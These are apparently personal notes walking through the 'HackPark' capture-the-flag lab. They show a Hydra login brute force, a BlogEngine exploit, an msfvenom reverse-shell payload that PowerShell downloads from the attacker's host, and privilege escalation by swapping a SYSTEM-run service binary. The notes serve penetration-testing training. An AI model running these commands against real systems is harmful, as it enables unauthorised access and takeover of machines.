<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>hackpark</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>hackpark</h1><br/><p><strong>HackPark</strong></p><p></p><p></p><p>What is the name of the joker ?</p><p></p><p>Download the image. Then search the image by uplading it to <strong>google image search</strong>.</p><p></p><p></p><p><strong>Brute Force the Login Page using Hydra:</strong></p><p></p><p>hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.229.129 http-post-form &quot;/Account/login.aspx?ReturnURL=/admin/:__VIEWSTATE=75frL29Jq77UAS5O6waIAgvpqUOtcagLXmAs8ntJGK3DU6IXmkigWCYXlctGEb2O2G%2BjF5IteFOYg9pWj2Mqq0iJxVrJkUODXhUuOJ8sbmce0tBELKmw72s8I9JOUKGp6Z87DHYCwVZSIB1k8QZzxc%2BDfuwsKdSogudxveYfMl9Xl9WN&amp;__EVENTVALIDATION=kEqTpl3NK636vrrQoIGLwaBPeMNLrYgB5eLO2J3lhWCriHgdsDifHhxinhhtmfiV8p%2Fdx0IPiK0B5uO5gDR8tsJcKtQEVnqRqGuba%2BcImoxZrFAdTL%2FfNB4nBipBifGFewi7YAqZ8JhkThaZTfMnUpVOTH8tU0jzP03GuC7bHCt9G9K1&amp;ctl00%24MainContent%24LoginUser%24UserName=^USER^&amp;ctl00%24MainContent%24LoginUser%24Password=^PASS^&amp;ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login failed&quot; -vv</p><p></p><p><img src="images/7-1.png" alt="images/7-1.png" /></p><p></p><p>Check the section <strong>[Cryptography--------&gt;hydra]</strong> for more details.</p><p></p><p>After login we find the version of application : Blogengine 3.3.6</p><p>searchsploit blogengine</p><p><img src="images/7-2.png" alt="images/7-2.png" /></p><p></p><p></p><p>We will use the 46353.cs</p><p>searchsploit -m aspx/webapps/46353.cs</p><p></p><p>Read the file. (And Finish the tasks)</p><p></p><p>1.Start Netcat listener</p><p>2.Change the IP &amp; Port for reverse connection inside the file.</p><p>3.Rename the file to the one specified in the file (PostView.ascx)</p><p>4.Follow the guide for upload</p><p>5.Finally follow the guide for exploitation</p><p></p><p>Once we have reverse shell. We need to switch to meterpreter for better control.</p><p></p><p><strong>Shell Switch</strong></p><p>Now, we switch to meterpreter shell for easier prevelege escalation.</p><p></p><p>we make a meterpreter payload using msfvenom.</p><p><em><strong>msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.11.72.31 LPORT=8888 -a x86 --encoder x86/shikata_ga_nai -f exe -o hackpark_revshell.exe</strong></em></p><p></p><p>We host this using python webserver.</p><p></p><p>Download using the last Powershell technique or any other.</p><p><em><strong>powershell &quot;(New-Object System.Net.WebClient).Downloadfile(&#39;http://10.11.72.31:8000/hackpark_revshell.exe&#39;,&#39;hackpark_revshell.exe&#39;)&quot;</strong></em></p><p></p><p><strong></strong></p><p><strong>Start Listner in msfconsole:</strong></p><p></p><p><em><strong>use multi/handler</strong></em></p><p><em><strong>SET PAYLOAD windows/meterpreter/reverse_tcp</strong></em></p><p><em><strong>SET LHOST 10.11.72.31</strong></em></p><p><em><strong>SET LPORT 8888</strong></em></p><p></p><p>Once setup â†’ Run the exploit in the shell we have.</p><p></p><p></p><p><strong>Privilege Escalation:</strong></p><p>Now for Privelege Escalation there are 2 ways.</p><p></p><p>Get winPEASx64.exe in the machine using meterpreter upload or powershell download.</p><p><strong>powershell -c Invoke-WebRequest -Uri http://10.11.72.31/THM_WinPrivEsc_Tools/winPEASx64.exe -OutFile winPEASx64.exe</strong></p><p>Run the executible <strong>winPEASx64.exe</strong></p><p></p><p><strong></strong></p><p><strong>Way-1</strong></p><p>In stored credentials we find the credential of Administrator. (4q6XvFES7Fdxs)</p><p><em><strong>xfreerdp /dynamic-resolution +clipboard /cert:ignore /v:10.10.229.129 /u:administrator /p:4q6XvFES7Fdxs</strong></em></p><p></p><p>We get direct RDP access to machine with Administrator account.</p><p>We get the user and root flags.</p><p></p><p><strong>Way-2</strong></p><p>We check the service WindowsScheduler in hope that it allows us to run our binaries.</p><p>We check the <strong>C:/Program Files (x86)/WindowsScheduler/events</strong> Folder and check the logs.</p><p></p><p>We find that <strong>Message.exe</strong> which has full access for everyone is run by <strong>system</strong> every 30 secs.</p><p></p><p>We rename the Message.exe to Message.bak</p><p>Finally, we rename our previously crafted reverse shell to Message.exe and put it in that folder.</p><p></p><p>We get ready in our multi/handler..</p><p></p><p>We receive yet another session from the same payload, but this time it is owned by NT Authority/SYSTEM.</p><p>We get the user and root flags.</p><p></p><p></p><p>Thanks !!</p></div>
</body>
</html>
